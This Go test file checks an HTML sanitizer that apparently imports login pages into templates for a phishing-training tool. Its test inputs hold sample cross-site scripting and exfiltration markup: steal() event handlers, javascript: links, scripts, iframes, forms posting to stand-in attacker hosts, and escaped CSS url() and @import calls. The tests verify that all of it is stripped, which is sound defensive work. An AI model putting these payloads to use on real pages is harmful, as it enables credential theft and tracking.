package importhtml

import (
	"bytes"
	"net/url"
	"strings"
	"testing"
	"text/template"

	"golang.org/x/net/html"
)

func TestSanitizeKeepsFormsAndRemovesActiveContent(t *testing.T) {
	base, _ := url.Parse("https://assets.example.test/account/page")
	input := `<html><head><link rel="stylesheet" href="/assets/login.css" media="all" onload="steal()"><link rel="preload" href="/evil.js"></head><body data-darkphish-training="static-v1"><p data-training-notice="true">obsolete</p><script>alert(1)</script><form action="https://collect.example.test" onsubmit="steal()"><label for="login">Login</label><input id="login" name="username" value="alice" onclick="steal()"><input type="password" name="password"><textarea name="note">hello</textarea><select name="kind"><option value="a" selected>A</option></select><button formaction="https://collect.example.test">Continue</button></form><a href="javascript:alert(1)">bad</a><img src="../logo.png" onerror="steal()"><div style="color:red;background-image:url(https://track.example.test)">content</div></body></html>`
	got, err := Sanitize(input, base)
	if err != nil {
		t.Fatal(err)
	}
	for _, blocked := range []string{"data-darkphish-training", "data-training-notice", "<script", "onsubmit", "onclick", "onerror", "formaction", "javascript:", "background-image", "https://collect.example.test", `rel="preload"`, "evil.js"} {
		if strings.Contains(got, blocked) {
			t.Fatalf("unsafe content survived: %s\n%s", blocked, got)
		}
	}
	for _, kept := range []string{`<link rel="stylesheet" href="https://assets.example.test/assets/login.css" media="all"/>`, `<form action="" method="post">`, `name="username"`, `value="alice"`, `type="password"`, `<textarea name="note">hello</textarea>`, `<select name="kind">`, `<button>Continue</button>`, `src="https://assets.example.test/logo.png"`, `style="color:red"`} {
		if !strings.Contains(got, kept) {
			t.Fatalf("expected content missing: %s\n%s", kept, got)
		}
	}
}

func TestSanitizeRejectsDangerousAttributesAndBoundsInput(t *testing.T) {
	got, err := Sanitize(`<body><iframe srcdoc="x"></iframe><svg><script>x</script></svg><svg><foreignObject><iframe src="https://evil.test"></iframe></foreignObject></svg><input type="file" name="upload"><img src="data:image/svg+xml,evil"><img src="data:image/png;base64,aGVsbG8="></body>`, nil)
	if err != nil {
		t.Fatal(err)
	}
	doc, err := html.Parse(strings.NewReader(got))
	if err != nil {
		t.Fatal(err)
	}
	var walk func(*html.Node)
	walk = func(n *html.Node) {
		for _, a := range n.Attr {
			if strings.HasPrefix(a.Key, "on") || a.Key == "srcdoc" || a.Key == "formaction" {
				t.Fatalf("unsafe attribute survived: %s", a.Key)
			}
		}
		for child := n.FirstChild; child != nil; child = child.NextSibling {
			walk(child)
		}
	}
	walk(doc)
	if strings.Contains(got, "<iframe") || strings.Contains(got, "<script") || strings.Contains(got, "foreignObject") || strings.Contains(got, "svg+xml") || !strings.Contains(got, `type="text"`) || !strings.Contains(got, `data:image/png;base64,aGVsbG8=`) {
		t.Fatal(got)
	}
	if _, err := Sanitize(strings.Repeat("x", maxBytes+1), nil); err != ErrSize {
		t.Fatal("missing input limit")
	}
}

func TestSanitizeKeepsSafeSVGArtwork(t *testing.T) {
	base, _ := url.Parse("https://accounts.example.test/signin")
	input := `<body><svg viewBox="0 0 48 48" height="48" width="48" aria-hidden="true"><g transform="translate(12 12)"><path fill="#4285F4" d="M24 12l8 8-8 8-8-8z"/><circle cx="24" cy="24" r="12" fill="#34A853"/><script>alert(1)</script><use href="#evil"/><animate attributeName="href" values="https://evil.test"/></g></svg></body>`
	got, err := Sanitize(input, base)
	if err != nil {
		t.Fatal(err)
	}
	for _, kept := range []string{`<svg viewBox="0 0 48 48" height="48" width="48"`, `<path fill="#4285F4"`, `<circle cx="24" cy="24" r="12" fill="#34A853"`, "M24 12l8 8-8 8-8-8z"} {
		if !strings.Contains(got, kept) {
			t.Fatalf("safe svg artwork missing: %s\n%s", kept, got)
		}
	}
	for _, blocked := range []string{"<script", "<use", "<animate", "evil.test", "href="} {
		if strings.Contains(got, blocked) {
			t.Fatalf("unsafe svg content survived: %s\n%s", blocked, got)
		}
	}
}

func TestSanitizeKeepsFrameworkClassNamesAndModernStyles(t *testing.T) {
	base, _ := url.Parse("https://accounts.example.test/")
	got, err := Sanitize(`<body><div class="a[b=cd] #e w-full" id="xId" role="dialog"><span style="--brand:#1a73e8;width:calc(100% - 24px);transform:translate(-50%,-50%);background-image:url(data:image/png;base64,aGVsbG8=);background-image:url(https://track.example.test/pixel)">text</span><img srcset="logo-2x.png 2x, http://evil.test/x.png 3x, logo.png" src="logo.png"></div></body>`, base)
	if err != nil {
		t.Fatal(err)
	}
	for _, kept := range []string{`class="a[b=cd] #e w-full"`, `id="xId"`, `role="dialog"`, `--brand:#1a73e8`, `width:calc(100% - 24px)`, `transform:translate(-50%,-50%)`, `url(data:image/png;base64,aGVsbG8=)`, `srcset="https://accounts.example.test/logo-2x.png 2x, https://accounts.example.test/logo.png"`} {
		if !strings.Contains(got, kept) {
			t.Fatalf("expected modern presentation missing: %s\n%s", kept, got)
		}
	}
	for _, blocked := range []string{"track.example.test", "evil.test"} {
		if strings.Contains(got, blocked) {
			t.Fatalf("unsafe reference survived: %s\n%s", blocked, got)
		}
	}
}

func TestSanitizeRemovesReservedRecipientControlNames(t *testing.T) {
	got, err := Sanitize(`<form><input name="RID"><textarea name=" rid ">x</textarea><select name="RiD"><option>one</option></select><button name="rid">go</button><input name="email"></form>`, nil)
	if err != nil {
		t.Fatal(err)
	}
	doc, err := html.Parse(strings.NewReader(got))
	if err != nil {
		t.Fatal(err)
	}
	var reserved, ordinary int
	var walk func(*html.Node)
	walk = func(n *html.Node) {
		if n.Type == html.ElementNode {
			for _, a := range n.Attr {
				if a.Key == "name" {
					if strings.EqualFold(strings.TrimSpace(a.Val), recipientParameter) {
						reserved++
					} else if a.Val == "email" {
						ordinary++
					}
				}
			}
		}
		for child := n.FirstChild; child != nil; child = child.NextSibling {
			walk(child)
		}
	}
	walk(doc)
	if reserved != 0 || ordinary != 1 {
		t.Fatalf("reserved name survived or ordinary name was removed: %s", got)
	}
}

func TestSanitizeKeepsTemplateDelimitersLiteral(t *testing.T) {
	input := `<p>{{.Email}} {{\example}} broken {{ open and }} close DARKPHISHIMPORTOPENDELIMITER</p><input name="email" value="{{.Email}}"><textarea name="message">{{.Email}}</textarea>`
	got, err := Sanitize(input, nil)
	if err != nil {
		t.Fatal(err)
	}
	document, err := html.Parse(strings.NewReader(got))
	if err != nil {
		t.Fatal(err)
	}
	var normalized bytes.Buffer
	if err := html.Render(&normalized, document); err != nil {
		t.Fatal(err)
	}
	tmpl, err := template.New("import").Parse(normalized.String())
	if err != nil {
		t.Fatalf("sanitized import is not a valid template: %v\n%s", err, got)
	}
	var rendered bytes.Buffer
	if err := tmpl.Execute(&rendered, map[string]string{"Email": "activated@example.test"}); err != nil {
		t.Fatal(err)
	}
	output := rendered.String()
	for _, literal := range []string{`{{.Email}}`, `{{\example}}`, `broken {{ open and }} close`, "DARKPHISHIMPORTOPENDELIMITER", `value="{{.Email}}"`, `>{{.Email}}</textarea>`} {
		if !strings.Contains(output, literal) {
			t.Fatalf("template delimiter was not preserved literally: %s\n%s", literal, output)
		}
	}
	if strings.Contains(output, "activated@example.test") {
		t.Fatal("untrusted imported template expression became active")
	}
}

func TestSanitizeKeepsFragmentLinksLocalAndOmitsBase(t *testing.T) {
	base, _ := url.Parse("https://example.test/path/page?x={{.Email}}")
	got, err := Sanitize(`<html><body><a href="#pricing">Pricing</a><img src="img/logo.png"></body></html>`, base)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(got, "<base ") {
		t.Fatalf("generated base element must be omitted: %s", got)
	}
	if !strings.Contains(got, `href="#pricing"`) {
		t.Fatalf("fragment link must remain document-local: %s", got)
	}
	if !strings.Contains(got, `src="https://example.test/path/img/logo.png"`) {
		t.Fatalf("relative resource must still resolve absolutely: %s", got)
	}
	if strings.Contains(got, "{{.Email}}") {
		t.Fatalf("attacker-controlled template action survived sanitization: %s", got)
	}
}

func TestSanitizesImportedStyleBlocks(t *testing.T) {
	base, _ := url.Parse("https://example.test/path/")
	got, err := Sanitize(`<html><head><style>.hero{background:u\72l(http://evil.test/hero.png)} @import "https://evil.test/x.css";</style><style>.card{color:red;font-family:'Google Sans'}.bg{background-image:url(https://cdn.example.test/hero.png)}@media (max-width:600px){.card{padding:0}}</style></head><body></body></html>`, base)
	if err != nil {
		t.Fatal(err)
	}
	for _, forbidden := range []string{"evil.test", "@import", "u\\72l"} {
		if strings.Contains(got, forbidden) {
			t.Fatalf("unsafe stylesheet content survived (%s): %s", forbidden, got)
		}
	}
	for _, kept := range []string{"<style>", ".card{color:red;font-family:'Google Sans'}", "url(https://cdn.example.test/hero.png)", "@media (max-width:600px){.card{padding:0"} {
		if !strings.Contains(got, kept) {
			t.Fatalf("safe stylesheet content missing: %s\n%s", kept, got)
		}
	}
}

func TestSanitizeStyleBlockCSSBracesStayTemplateLiteral(t *testing.T) {
	base, _ := url.Parse("https://example.test/")
	got, err := Sanitize(`<html><head><style>@media (max-width:600px){.card{padding:0}}</style></head><body><p>plain}}text</p></body></html>`, base)
	if err != nil {
		t.Fatal(err)
	}
	doc, err := template.New("imported").Parse(got)
	if err != nil {
		t.Fatalf("sanitized output must stay a valid template: %v\n%s", err, got)
	}
	var rendered bytes.Buffer
	if err := doc.Execute(&rendered, struct{}{}); err != nil {
		t.Fatalf("sanitized output must execute as a template: %v\n%s", err, got)
	}
	if !strings.Contains(rendered.String(), "@media (max-width:600px){.card{padding:0}}") {
		t.Fatalf("css braces must survive template rendering literally: %s", rendered.String())
	}
}

func TestSanitizeDiscardsNoscriptSubtrees(t *testing.T) {
	input := `<html><head><noscript><link rel="stylesheet" href="https://attacker.example/evil.css"></noscript></head><body><noscript><form action="https://attacker.example/collect"><input name="secret"><iframe src="https://attacker.example/frame"></iframe></form></noscript><p>safe</p></body></html>`
	got, err := Sanitize(input, nil)
	if err != nil {
		t.Fatal(err)
	}
	for _, forbidden := range []string{"<noscript", "attacker.example", "name=\"secret\"", "<iframe", "<form"} {
		if strings.Contains(got, forbidden) {
			t.Fatalf("noscript subtree survived sanitization (%s): %s", forbidden, got)
		}
	}
	if !strings.Contains(got, "<p>safe</p>") {
		t.Fatalf("ordinary content was removed with noscript: %s", got)
	}
}
